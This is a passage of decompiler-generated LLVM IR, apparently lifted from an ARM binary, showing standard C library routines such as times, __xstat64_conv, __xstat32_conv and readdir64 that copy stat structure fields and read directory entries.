  %v0_14db4 = phi i32 [ %v0_14db4.pre, %dec_label_pc_14d9c.dec_label_pc_14db4_crit_edge ], [ -1, %dec_label_pc_14db0 ], [ %v4_14d8c, %dec_label_pc_14d8c ]
  %v2_14db8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14db8, i32* @r4, align 4
  ret i32 %v0_14db4

; uselistorder directives
  uselistorder i32 %v4_14d8c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_14db4, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_14dd8 = load i32, i32* @r0, align 4
  ret i32 %v1_14dd8
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_14ddc = load i32, i32* @r4, align 4
  store i32 %v3_14ddc, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_14df4 = inttoptr i32 %arg2 to i8*
  %v4_14df4 = call i32 @__GI_memset(i8* %v3_14df4, i32 0, i32 104)
  %v2_14df8 = load i32, i32* %arg1, align 4
  store i32 %v2_14df8, i32* %r3.global-to-local, align 4
  %v3_14df8 = add i32 %tmp, 4
  %v4_14df8 = inttoptr i32 %v3_14df8 to i32*
  %v5_14df8 = load i32, i32* %v4_14df8, align 4
  store i32 %v5_14df8, i32* %r4.global-to-local, align 4
  %v0_14dfc = load i32, i32* %r5.global-to-local, align 4
  %v1_14dfc = inttoptr i32 %v0_14dfc to i32*
  store i32 %v2_14df8, i32* %v1_14dfc, align 4
  %v3_14dfc = add i32 %v0_14dfc, 4
  %v4_14dfc = inttoptr i32 %v3_14dfc to i32*
  %v5_14dfc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14dfc, i32* %v4_14dfc, align 4
  %v0_14e00 = load i32, i32* %r6.global-to-local, align 4
  %v1_14e00 = add i32 %v0_14e00, 12
  %v2_14e00 = inttoptr i32 %v1_14e00 to i32*
  %v3_14e00 = load i32, i32* %v2_14e00, align 4
  %v1_14e04 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e04 = add i32 %v1_14e04, 12
  %v3_14e04 = inttoptr i32 %v2_14e04 to i32*
  store i32 %v3_14e00, i32* %v3_14e04, align 4
  %v0_14e08 = load i32, i32* %r6.global-to-local, align 4
  %v1_14e08 = add i32 %v0_14e08, 96
  store i32 %v1_14e08, i32* %r3.global-to-local, align 4
  %v1_14e0c = inttoptr i32 %v1_14e08 to i32*
  %v2_14e0c = load i32, i32* %v1_14e0c, align 4
  store i32 %v2_14e0c, i32* %r3.global-to-local, align 4
  %v3_14e0c = add i32 %v0_14e08, 100
  %v4_14e0c = inttoptr i32 %v3_14e0c to i32*
  %v5_14e0c = load i32, i32* %v4_14e0c, align 4
  store i32 %v5_14e0c, i32* %r4.global-to-local, align 4
  %v1_14e10 = add i32 %v0_14e08, 56
  %v2_14e10 = inttoptr i32 %v1_14e10 to i32*
  %v3_14e10 = load i32, i32* %v2_14e10, align 4
  store i32 %v3_14e10, i32* %r2.global-to-local, align 4
  %v1_14e14 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e14 = add i32 %v1_14e14, 96
  %v3_14e14 = inttoptr i32 %v2_14e14 to i32*
  store i32 %v2_14e0c, i32* %v3_14e14, align 4
  %v0_14e18 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e18 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e18 = add i32 %v1_14e18, 100
  %v3_14e18 = inttoptr i32 %v2_14e18 to i32*
  store i32 %v0_14e18, i32* %v3_14e18, align 4
  %v0_14e1c = load i32, i32* %r6.global-to-local, align 4
  %v1_14e1c = add i32 %v0_14e1c, 24
  store i32 %v1_14e1c, i32* %ip.global-to-local, align 4
  %v1_14e20 = inttoptr i32 %v1_14e1c to i32*
  %v2_14e20 = load i32, i32* %v1_14e20, align 4
  store i32 %v2_14e20, i32* %ip.global-to-local, align 4
  %v3_14e20 = add i32 %v0_14e1c, 28
  %v4_14e20 = inttoptr i32 %v3_14e20 to i32*
  %v5_14e20 = load i32, i32* %v4_14e20, align 4
  store i32 %v5_14e20, i32* %lr.global-to-local, align 4
  %v0_14e24 = load i32, i32* %r2.global-to-local, align 4
  %v1_14e24 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e24 = add i32 %v1_14e24, 56
  %v3_14e24 = inttoptr i32 %v2_14e24 to i32*
  store i32 %v0_14e24, i32* %v3_14e24, align 4
  %v0_14e28 = load i32, i32* %r6.global-to-local, align 4
  %v1_14e28 = add i32 %v0_14e28, 72
  store i32 %v1_14e28, i32* %r3.global-to-local, align 4
  %v1_14e2c = add i32 %v0_14e28, 32
  store i32 %v1_14e2c, i32* %r7.global-to-local, align 4
  %v1_14e30 = inttoptr i32 %v1_14e2c to i32*
  %v2_14e30 = load i32, i32* %v1_14e30, align 4
  store i32 %v2_14e30, i32* %r7.global-to-local, align 4
  %v3_14e30 = add i32 %v0_14e28, 36
  %v4_14e30 = inttoptr i32 %v3_14e30 to i32*
  %v5_14e30 = load i32, i32* %v4_14e30, align 4
  store i32 %v5_14e30, i32* %r8.global-to-local, align 4
  %v1_14e34 = inttoptr i32 %v1_14e28 to i32*
  %v2_14e34 = load i32, i32* %v1_14e34, align 4
  %v3_14e34 = add i32 %v0_14e28, 76
  %v4_14e34 = inttoptr i32 %v3_14e34 to i32*
  %v5_14e34 = load i32, i32* %v4_14e34, align 4
  store i32 %v5_14e34, i32* %r1.global-to-local, align 4
  %v0_14e38 = load i32, i32* %r5.global-to-local, align 4
  %v1_14e38 = add i32 %v0_14e38, 72
  %v1_14e3c = inttoptr i32 %v1_14e38 to i32*
  store i32 %v2_14e34, i32* %v1_14e3c, align 4
  %v3_14e3c = add i32 %v0_14e38, 76
  %v4_14e3c = inttoptr i32 %v3_14e3c to i32*
  %v5_14e3c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14e3c, i32* %v4_14e3c, align 4
  %v0_14e40 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e40 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e40 = add i32 %v1_14e40, 32
  %v3_14e40 = inttoptr i32 %v2_14e40 to i32*
  store i32 %v0_14e40, i32* %v3_14e40, align 4
  %v0_14e44 = load i32, i32* %r8.global-to-local, align 4
  %v1_14e44 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e44 = add i32 %v1_14e44, 36
  %v3_14e44 = inttoptr i32 %v2_14e44 to i32*
  store i32 %v0_14e44, i32* %v3_14e44, align 4
  %v0_14e48 = load i32, i32* %r6.global-to-local, align 4
  %v1_14e48 = add i32 %v0_14e48, 80
  store i32 %v1_14e48, i32* %r3.global-to-local, align 4
  %v1_14e4c = add i32 %v0_14e48, 48
  store i32 %v1_14e4c, i32* %r7.global-to-local, align 4
  %v1_14e50 = inttoptr i32 %v1_14e4c to i32*
  %v2_14e50 = load i32, i32* %v1_14e50, align 4
  store i32 %v2_14e50, i32* %r7.global-to-local, align 4
  %v3_14e50 = add i32 %v0_14e48, 52
  %v4_14e50 = inttoptr i32 %v3_14e50 to i32*
  %v5_14e50 = load i32, i32* %v4_14e50, align 4
  store i32 %v5_14e50, i32* %r8.global-to-local, align 4
  %v1_14e54 = inttoptr i32 %v1_14e48 to i32*
  %v2_14e54 = load i32, i32* %v1_14e54, align 4
  %v3_14e54 = add i32 %v0_14e48, 84
  %v4_14e54 = inttoptr i32 %v3_14e54 to i32*
  %v5_14e54 = load i32, i32* %v4_14e54, align 4
  store i32 %v5_14e54, i32* %r1.global-to-local, align 4
  %v1_14e58 = add i32 %v0_14e48, 16
  %v2_14e58 = inttoptr i32 %v1_14e58 to i32*
  %v3_14e58 = load i32, i32* %v2_14e58, align 4
  store i32 %v3_14e58, i32* %r2.global-to-local, align 4
  %v0_14e5c = load i32, i32* %r5.global-to-local, align 4
  %v1_14e5c = add i32 %v0_14e5c, 80
  %v1_14e60 = inttoptr i32 %v1_14e5c to i32*
  store i32 %v2_14e54, i32* %v1_14e60, align 4
  %v3_14e60 = add i32 %v0_14e5c, 84
  %v4_14e60 = inttoptr i32 %v3_14e60 to i32*
  %v5_14e60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14e60, i32* %v4_14e60, align 4
  %v0_14e64 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e64 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e64 = add i32 %v1_14e64, 48
  %v3_14e64 = inttoptr i32 %v2_14e64 to i32*
  store i32 %v0_14e64, i32* %v3_14e64, align 4
  %v0_14e68 = load i32, i32* %r8.global-to-local, align 4
  %v1_14e68 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e68 = add i32 %v1_14e68, 52
  %v3_14e68 = inttoptr i32 %v2_14e68 to i32*
  store i32 %v0_14e68, i32* %v3_14e68, align 4
  %v0_14e6c = load i32, i32* %r2.global-to-local, align 4
  %v1_14e6c = load i32, i32* %r5.global-to-local, align 4
  %v2_14e6c = add i32 %v1_14e6c, 16
  %v3_14e6c = inttoptr i32 %v2_14e6c to i32*
  store i32 %v0_14e6c, i32* %v3_14e6c, align 4
  %v0_14e70 = load i32, i32* %r6.global-to-local, align 4
  %v1_14e70 = add i32 %v0_14e70, 88
  store i32 %v1_14e70, i32* %r3.global-to-local, align 4
  %v1_14e74 = add i32 %v0_14e70, 20
  %v2_14e74 = inttoptr i32 %v1_14e74 to i32*
  %v3_14e74 = load i32, i32* %v2_14e74, align 4
  store i32 %v3_14e74, i32* %r2.global-to-local, align 4
  %v1_14e78 = inttoptr i32 %v1_14e70 to i32*
  %v2_14e78 = load i32, i32* %v1_14e78, align 4
  %v3_14e78 = add i32 %v0_14e70, 92
  %v4_14e78 = inttoptr i32 %v3_14e78 to i32*
  %v5_14e78 = load i32, i32* %v4_14e78, align 4
  store i32 %v5_14e78, i32* %r1.global-to-local, align 4
  %v1_14e7c = add i32 %v0_14e70, 64
  store i32 %v1_14e7c, i32* %r6.global-to-local, align 4
  %v1_14e80 = inttoptr i32 %v1_14e7c to i32*
  %v2_14e80 = load i32, i32* %v1_14e80, align 4
  store i32 %v2_14e80, i32* %r6.global-to-local, align 4
  %v3_14e80 = add i32 %v0_14e70, 68
  %v4_14e80 = inttoptr i32 %v3_14e80 to i32*
  %v5_14e80 = load i32, i32* %v4_14e80, align 4
  store i32 %v5_14e80, i32* %r7.global-to-local, align 4
  %v0_14e84 = load i32, i32* %r5.global-to-local, align 4
  %v1_14e84 = add i32 %v0_14e84, 88
  store i32 %v1_14e84, i32* %r3.global-to-local, align 4
  %v2_14e88 = add i32 %v0_14e84, 20
  %v3_14e88 = inttoptr i32 %v2_14e88 to i32*
  store i32 %v3_14e74, i32* %v3_14e88, align 4
  %v0_14e8c = load i32, i32* %ip.global-to-local, align 4
  %v1_14e8c = load i32, i32* %r5.global-to-local, align 4
  %v2_14e8c = add i32 %v1_14e8c, 24
  %v3_14e8c = inttoptr i32 %v2_14e8c to i32*
  store i32 %v0_14e8c, i32* %v3_14e8c, align 4
  %v0_14e90 = load i32, i32* %lr.global-to-local, align 4
  %v1_14e90 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e90 = add i32 %v1_14e90, 28
  %v3_14e90 = inttoptr i32 %v2_14e90 to i32*
  store i32 %v0_14e90, i32* %v3_14e90, align 4
  %v0_14e94 = load i32, i32* %r6.global-to-local, align 4
  %v1_14e94 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e94 = add i32 %v1_14e94, 64
  %v3_14e94 = inttoptr i32 %v2_14e94 to i32*
  store i32 %v0_14e94, i32* %v3_14e94, align 4
  %v0_14e98 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e98 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e98 = add i32 %v1_14e98, 68
  %v3_14e98 = inttoptr i32 %v2_14e98 to i32*
  store i32 %v0_14e98, i32* %v3_14e98, align 4
  %v0_14e9c = load i32, i32* %r3.global-to-local, align 4
  %v1_14e9c = inttoptr i32 %v0_14e9c to i32*
  store i32 %v2_14e78, i32* %v1_14e9c, align 4
  %v3_14e9c = add i32 %v0_14e9c, 4
  %v4_14e9c = inttoptr i32 %v3_14e9c to i32*
  %v5_14e9c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14e9c, i32* %v4_14e9c, align 4
  %v2_14ea0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14ea0, i32* %r4.global-to-local, align 4
  ret i32 %v2_14e78

; uselistorder directives
  uselistorder i32 %v0_14e70, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_14e48, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_14ea8 = load i32, i32* @r4, align 4
  store i32 %v3_14ea8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_14ec0 = inttoptr i32 %arg2 to i8*
  %v4_14ec0 = call i32 @__GI_memset(i8* %v3_14ec0, i32 0, i32 88)
  %v2_14ec4 = load i32, i32* %arg1, align 4
  %v3_14ec4 = add i32 %tmp, 4
  %v4_14ec4 = inttoptr i32 %v3_14ec4 to i32*
  %v5_14ec4 = load i32, i32* %v4_14ec4, align 4
  store i32 %v5_14ec4, i32* %r4.global-to-local, align 4
  %v0_14ec8 = load i32, i32* %r6.global-to-local, align 4
  %v1_14ec8 = inttoptr i32 %v0_14ec8 to i32*
  store i32 %v2_14ec4, i32* %v1_14ec8, align 4
  %v3_14ec8 = add i32 %v0_14ec8, 4
  %v4_14ec8 = inttoptr i32 %v3_14ec8 to i32*
  %v5_14ec8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14ec8, i32* %v4_14ec8, align 4
  %v0_14ecc = load i32, i32* %r5.global-to-local, align 4
  %v1_14ecc = add i32 %v0_14ecc, 32
  %v1_14ed0 = inttoptr i32 %v1_14ecc to i32*
  %v2_14ed0 = load i32, i32* %v1_14ed0, align 4
  %v3_14ed0 = add i32 %v0_14ecc, 36
  %v4_14ed0 = inttoptr i32 %v3_14ed0 to i32*
  %v5_14ed0 = load i32, i32* %v4_14ed0, align 4
  store i32 %v5_14ed0, i32* %r4.global-to-local, align 4
  %v1_14ed4 = add i32 %v0_14ecc, 96
  %v2_14ed4 = inttoptr i32 %v1_14ed4 to i32*
  %v3_14ed4 = load i32, i32* %v2_14ed4, align 4
  store i32 %v3_14ed4, i32* %r2.global-to-local, align 4
  %v1_14ed8 = load i32, i32* %r6.global-to-local, align 4
  %v2_14ed8 = add i32 %v1_14ed8, 32
  %v3_14ed8 = inttoptr i32 %v2_14ed8 to i32*
  store i32 %v2_14ed0, i32* %v3_14ed8, align 4
  %v0_14edc = load i32, i32* %r4.global-to-local, align 4
  %v1_14edc = load i32, i32* %r6.global-to-local, align 4
  %v2_14edc = add i32 %v1_14edc, 36
  %v3_14edc = inttoptr i32 %v2_14edc to i32*
  store i32 %v0_14edc, i32* %v3_14edc, align 4
  %v0_14ee0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ee0 = load i32, i32* %r6.global-to-local, align 4
  %v2_14ee0 = add i32 %v1_14ee0, 12
  %v3_14ee0 = inttoptr i32 %v2_14ee0 to i32*
  store i32 %v0_14ee0, i32* %v3_14ee0, align 4
  %v0_14ee4 = load i32, i32* %r5.global-to-local, align 4
  %v1_14ee4 = add i32 %v0_14ee4, 48
  %v2_14ee4 = inttoptr i32 %v1_14ee4 to i32*
  %v3_14ee4 = load i32, i32* %v2_14ee4, align 4
  %v1_14ee8 = add i32 %v0_14ee4, 24
  store i32 %v1_14ee8, i32* %ip.global-to-local, align 4
  %v1_14eec = inttoptr i32 %v1_14ee8 to i32*
  %v2_14eec = load i32, i32* %v1_14eec, align 4
  store i32 %v2_14eec, i32* %ip.global-to-local, align 4
  %v3_14eec = add i32 %v0_14ee4, 28
  %v4_14eec = inttoptr i32 %v3_14eec to i32*
  %v5_14eec = load i32, i32* %v4_14eec, align 4
  store i32 %v5_14eec, i32* %lr.global-to-local, align 4
  %v1_14ef0 = load i32, i32* %r6.global-to-local, align 4
  %v2_14ef0 = add i32 %v1_14ef0, 44
  %v3_14ef0 = inttoptr i32 %v2_14ef0 to i32*
  store i32 %v3_14ee4, i32* %v3_14ef0, align 4
  %v0_14ef4 = load i32, i32* %r5.global-to-local, align 4
  %v1_14ef4 = add i32 %v0_14ef4, 64
  %v2_14ef4 = inttoptr i32 %v1_14ef4 to i32*
  %v3_14ef4 = load i32, i32* %v2_14ef4, align 4
  %v1_14ef8 = add i32 %v0_14ef4, 56
  %v2_14ef8 = inttoptr i32 %v1_14ef8 to i32*
  %v3_14ef8 = load i32, i32* %v2_14ef8, align 4
  store i32 %v3_14ef8, i32* %r2.global-to-local, align 4
  %v1_14efc = load i32, i32* %r6.global-to-local, align 4
  %v2_14efc = add i32 %v1_14efc, 52
  %v3_14efc = inttoptr i32 %v2_14efc to i32*
  store i32 %v3_14ef4, i32* %v3_14efc, align 4
  %v0_14f00 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f00 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f00 = add i32 %v1_14f00, 48
  %v3_14f00 = inttoptr i32 %v2_14f00 to i32*
  store i32 %v0_14f00, i32* %v3_14f00, align 4
  %v0_14f04 = load i32, i32* %r5.global-to-local, align 4
  %v1_14f04 = add i32 %v0_14f04, 72
  %v1_14f08 = inttoptr i32 %v1_14f04 to i32*
  %v2_14f08 = load i32, i32* %v1_14f08, align 4
  %v3_14f08 = add i32 %v0_14f04, 76
  %v4_14f08 = inttoptr i32 %v3_14f08 to i32*
  %v5_14f08 = load i32, i32* %v4_14f08, align 4
  store i32 %v5_14f08, i32* %r1.global-to-local, align 4
  %v0_14f0c = load i32, i32* %r6.global-to-local, align 4
  %v1_14f0c = add i32 %v0_14f0c, 56
  %v1_14f10 = inttoptr i32 %v1_14f0c to i32*
  store i32 %v2_14f08, i32* %v1_14f10, align 4
  %v3_14f10 = add i32 %v0_14f0c, 60
  %v4_14f10 = inttoptr i32 %v3_14f10 to i32*
  %v5_14f10 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14f10, i32* %v4_14f10, align 4
  %v0_14f14 = load i32, i32* %r5.global-to-local, align 4
  %v1_14f14 = add i32 %v0_14f14, 80
  %v1_14f18 = inttoptr i32 %v1_14f14 to i32*
  %v2_14f18 = load i32, i32* %v1_14f18, align 4
  %v3_14f18 = add i32 %v0_14f14, 84
  %v4_14f18 = inttoptr i32 %v3_14f18 to i32*
  %v5_14f18 = load i32, i32* %v4_14f18, align 4
  store i32 %v5_14f18, i32* %r1.global-to-local, align 4
  %v0_14f1c = load i32, i32* %r6.global-to-local, align 4
  %v1_14f1c = add i32 %v0_14f1c, 64
  %v1_14f20 = inttoptr i32 %v1_14f1c to i32*
  store i32 %v2_14f18, i32* %v1_14f20, align 4
  %v3_14f20 = add i32 %v0_14f1c, 68
  %v4_14f20 = inttoptr i32 %v3_14f20 to i32*
  %v5_14f20 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14f20, i32* %v4_14f20, align 4
  %v0_14f24 = load i32, i32* %r5.global-to-local, align 4
  %v1_14f24 = add i32 %v0_14f24, 16
  %v2_14f24 = inttoptr i32 %v1_14f24 to i32*
  %v3_14f24 = load i32, i32* %v2_14f24, align 4
  %v1_14f28 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f28 = add i32 %v1_14f28, 16
  %v3_14f28 = inttoptr i32 %v2_14f28 to i32*
  store i32 %v3_14f24, i32* %v3_14f28, align 4
  %v0_14f2c = load i32, i32* %r5.global-to-local, align 4
  %v1_14f2c = add i32 %v0_14f2c, 88
  %v1_14f30 = add i32 %v0_14f2c, 20
  %v2_14f30 = inttoptr i32 %v1_14f30 to i32*
  %v3_14f30 = load i32, i32* %v2_14f30, align 4
  store i32 %v3_14f30, i32* %r2.global-to-local, align 4
  %v1_14f34 = inttoptr i32 %v1_14f2c to i32*
  %v2_14f34 = load i32, i32* %v1_14f34, align 4
  %v3_14f34 = add i32 %v0_14f2c, 92
  %v4_14f34 = inttoptr i32 %v3_14f34 to i32*
  %v5_14f34 = load i32, i32* %v4_14f34, align 4
  store i32 %v5_14f34, i32* %r1.global-to-local, align 4
  %v0_14f38 = load i32, i32* %r6.global-to-local, align 4
  %v1_14f38 = add i32 %v0_14f38, 72
  %v1_14f3c = inttoptr i32 %v1_14f38 to i32*
  store i32 %v2_14f34, i32* %v1_14f3c, align 4
  %v3_14f3c = add i32 %v0_14f38, 76
  %v4_14f3c = inttoptr i32 %v3_14f3c to i32*
  %v5_14f3c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14f3c, i32* %v4_14f3c, align 4
  %v0_14f40 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f40 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f40 = add i32 %v1_14f40, 20
  %v3_14f40 = inttoptr i32 %v2_14f40 to i32*
  store i32 %v0_14f40, i32* %v3_14f40, align 4
  %v0_14f44 = load i32, i32* %ip.global-to-local, align 4
  %v1_14f44 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f44 = add i32 %v1_14f44, 24
  %v3_14f44 = inttoptr i32 %v2_14f44 to i32*
  store i32 %v0_14f44, i32* %v3_14f44, align 4
  %v0_14f48 = load i32, i32* %lr.global-to-local, align 4
  %v1_14f48 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f48 = add i32 %v1_14f48, 28
  %v3_14f48 = inttoptr i32 %v2_14f48 to i32*
  store i32 %v0_14f48, i32* %v3_14f48, align 4
  %v2_14f4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14f4c, i32* %r4.global-to-local, align 4
  ret i32 %v2_14f34

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r6, align 4
  %v1_14f68 = add i32 %tmp, 24
  store i32 %v1_14f68, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_14f80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 112) to i32*), align 4
  store i32 %v4_14f80, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14f80)
  %v0_14f94 = load i32, i32* @r6, align 4
  %v2_14f94 = add i32 %v0_14f94, 16
  %v3_14f94 = inttoptr i32 %v2_14f94 to i32*
  %v4_14f94 = load i32, i32* %v3_14f94, align 4
  store i32 %v4_14f94, i32* %ip.global-to-local, align 4
  store i32 85920, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14f94)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_14fa4

dec_label_pc_14fa4:                               ; preds = %dec_label_pc_14fd4, %entry
  %v0_14fa4 = load i32, i32* @r5, align 4
  %v1_14fa4 = add i32 %v0_14fa4, 4
  %v2_14fa4 = inttoptr i32 %v1_14fa4 to i32*
  %v3_14fa4 = load i32, i32* %v2_14fa4, align 4
  %v4_14fa4 = add i32 %v0_14fa4, 8
  %v5_14fa4 = inttoptr i32 %v4_14fa4 to i32*
  %v6_14fa4 = load i32, i32* %v5_14fa4, align 4
  %tmp10 = icmp ugt i32 %v6_14fa4, %v3_14fa4
  br i1 %tmp10, label %dec_label_pc_14fd4, label %dec_label_pc_14fb0

dec_label_pc_14fb0:                               ; preds = %dec_label_pc_14fa4
  %v1_14fb0 = inttoptr i32 %v0_14fa4 to i32*
  %v2_14fb0 = load i32, i32* %v1_14fb0, align 4
  %v1_14fb4 = add i32 %v0_14fa4, 12
  %v2_14fb4 = inttoptr i32 %v1_14fb4 to i32*
  %v3_14fb4 = load i32, i32* %v2_14fb4, align 4
  %v1_14fb8 = add i32 %v0_14fa4, 20
  %v2_14fb8 = inttoptr i32 %v1_14fb8 to i32*
  %v3_14fb8 = load i32, i32* %v2_14fb8, align 4
  %v4_14fbc = inttoptr i32 %v3_14fb4 to i32*
  %v5_14fbc = call i32 @__getdents64(i32 %v2_14fb0, i32* %v4_14fbc, i32 %v3_14fb8, i32 %v6_14fa4)
  %tmp9 = icmp slt i32 %v5_14fbc, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_14fcc

.thread:                                          ; preds = %dec_label_pc_14fb0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15004

dec_label_pc_14fcc:                               ; preds = %dec_label_pc_14fb0
  %v1_14fcc = load i32, i32* @r5, align 4
  %v2_14fcc = add i32 %v1_14fcc, 8
  %v3_14fcc = inttoptr i32 %v2_14fcc to i32*
  store i32 %v5_14fbc, i32* %v3_14fcc, align 4
  %v0_14fd0 = load i32, i32* @r7, align 4
  %v1_14fd0 = load i32, i32* @r5, align 4
  %v2_14fd0 = add i32 %v1_14fd0, 4
  %v3_14fd0 = inttoptr i32 %v2_14fd0 to i32*
  store i32 %v0_14fd0, i32* %v3_14fd0, align 4
  %v0_14fd4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14fd4

dec_label_pc_14fd4:                               ; preds = %dec_label_pc_14fa4, %dec_label_pc_14fcc
  %v1_14ff8 = phi i32 [ %v0_14fa4, %dec_label_pc_14fa4 ], [ %v0_14fd4.pre, %dec_label_pc_14fcc ]
  %v1_14fd4 = add i32 %v1_14ff8, 4
  %v2_14fd4 = inttoptr i32 %v1_14fd4 to i32*
  %v3_14fd4 = load i32, i32* %v2_14fd4, align 4
  %v1_14fd8 = add i32 %v1_14ff8, 12
  %v2_14fd8 = inttoptr i32 %v1_14fd8 to i32*
  %v3_14fd8 = load i32, i32* %v2_14fd8, align 4
  %v2_14fdc = add i32 %v3_14fd8, %v3_14fd4
  store i32 %v2_14fdc, i32* @r4, align 4
  %v3_14fe0 = inttoptr i32 %v2_14fdc to i32*
  %v4_14fe0 = load i32, i32* %v3_14fe0, align 4
  %v1_14fe4 = add i32 %v2_14fdc, 4
  %v2_14fe4 = inttoptr i32 %v1_14fe4 to i32*
  %v3_14fe4 = load i32, i32* %v2_14fe4, align 4
  %v1_14fe8 = add i32 %v2_14fdc, 16
  %v2_14fe8 = inttoptr i32 %v1_14fe8 to i16*
  %v3_14fe8 = load i16, i16* %v2_14fe8, align 2
  %v4_14fe8 = zext i16 %v3_14fe8 to i32
  %v1_14fec = add i32 %v2_14fdc, 8
  %v2_14fec = inttoptr i32 %v1_14fec to i32*
  %v3_14fec = load i32, i32* %v2_14fec, align 4
  store i32 %v3_14fec, i32* %ip.global-to-local, align 4
  %v2_14ff0 = add i32 %v4_14fe8, %v3_14fd4
  %v2_14ff4 = or i32 %v3_14fe4, %v4_14fe0
  %v4_14ff4 = icmp eq i32 %v2_14ff4, 0
  store i32 %v2_14ff0, i32* %v2_14fd4, align 4
  %v0_14ffc = load i32, i32* %ip.global-to-local, align 4
  %v1_14ffc = load i32, i32* @r5, align 4
  %v2_14ffc = add i32 %v1_14ffc, 16
  %v3_14ffc = inttoptr i32 %v2_14ffc to i32*
  store i32 %v0_14ffc, i32* %v3_14ffc, align 4
  br i1 %v4_14ff4, label %dec_label_pc_14fa4, label %dec_label_pc_15004

dec_label_pc_15004:                               ; preds = %dec_label_pc_14fd4, %.thread
  %v0_15010 = load i32, i32* @r6, align 4
  %v2_15010 = add i32 %v0_15010, 44
  %v3_15010 = inttoptr i32 %v2_15010 to i32*
  %v4_15010 = load i32, i32* %v3_15010, align 4
  store i32 %v4_15010, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15010)
  %v0_1501c = load i32, i32* @r4, align 4
  ret i32 %v0_1501c

; uselistorder directives
  uselistorder i32 %v2_14fdc, { 1, 0, 3, 2, 4 }
